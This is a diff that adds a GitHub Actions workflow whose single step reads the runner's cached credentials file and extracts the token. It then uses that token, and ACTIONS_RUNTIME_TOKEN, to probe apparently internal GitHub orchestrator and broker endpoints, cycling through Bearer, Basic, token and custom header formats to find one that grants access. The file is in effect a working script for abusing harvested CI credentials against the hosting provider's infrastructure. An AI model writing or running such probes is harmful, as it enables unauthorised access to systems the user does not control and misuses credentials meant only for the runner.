@@ -1,0 +1,67 @@
+name: Token Auth Test
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Use runner credentials against internal services
+        run: |
+          CREDS_FILE="/home/runner/actions-runner/cached/2.335.1/.credentials"
+          INT="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          BROKER="https://broker.actions.githubusercontent.com"
+          
+          # Extract the token from .credentials without echoing it
+          TOKEN=$(python3 -c "
+          import json
+          with open('$CREDS_FILE') as f:
+              d = json.load(f)
+          print(d.get('Data',{}).get('token','') if isinstance(d.get('Data'),dict) else d.get('data',{}).get('token',''))
+          " 2>/dev/null)
+          SCHEME=$(python3 -c "
+          import json
+          with open('$CREDS_FILE') as f:
+              d = json.load(f)
+          print(d.get('Scheme',''))
+          " 2>/dev/null)
+          
+          echo "Token length: ${#TOKEN}"
+          echo "Auth scheme: $SCHEME"
+          
+          # Test against orchestrator with the runner's own token
+          echo ""
+          echo "=== Orchestrator with runner token ==="
+          RESP=$(curl -s -w "\n%{http_code}" -H "Authorization: Bearer $TOKEN" "$INT/vm/v1" 2>/dev/null)
+          STATUS=$(echo "$RESP" | tail -1)
+          BODY=$(echo "$RESP" | head -1)
+          echo "Bearer: $STATUS - ${BODY:0:100}"
+          
+          RESP2=$(curl -s -w "\n%{http_code}" -H "Authorization: $SCHEME $TOKEN" "$INT/vm/v1" 2>/dev/null)
+          STATUS2=$(echo "$RESP2" | tail -1)
+          BODY2=$(echo "$RESP2" | head -1)
+          echo "$SCHEME: $STATUS2 - ${BODY2:0:100}"
+          
+          echo ""
+          echo "=== Broker service ==="
+          curl -s -w "\n%{http_code}" --max-time 3 "$BROKER/" 2>/dev/null | head -3
+          echo ""
+          curl -s -w "\n%{http_code}" --max-time 3 -H "Authorization: Bearer $TOKEN" "$BROKER/" 2>/dev/null | head -3
+          echo ""
+          curl -s -w "\n%{http_code}" --max-time 3 "$BROKER/negotiate" 2>/dev/null | head -3
+          
+          echo ""
+          echo "=== Orchestrator with different auth formats ==="
+          for HDR in "Authorization: token $TOKEN" "Authorization: Basic $(echo -n ":$TOKEN" | base64)" "X-JWT-Token: $TOKEN"; do
+            KEY=$(echo "$HDR" | cut -d: -f1)
+            RESP=$(curl -s -w "\n%{http_code}" --max-time 2 -H "$HDR" "$INT/vm/v1" 2>/dev/null)
+            S=$(echo "$RESP" | tail -1)
+            B=$(echo "$RESP" | head -1)
+            echo "  $KEY: $S - ${B:0:80}"
+          done
+          
+          echo ""
+          echo "=== Try ACTIONS_RUNTIME_TOKEN against broker ==="
+          curl -s -w "\n%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "$BROKER/" 2>/dev/null | head -3
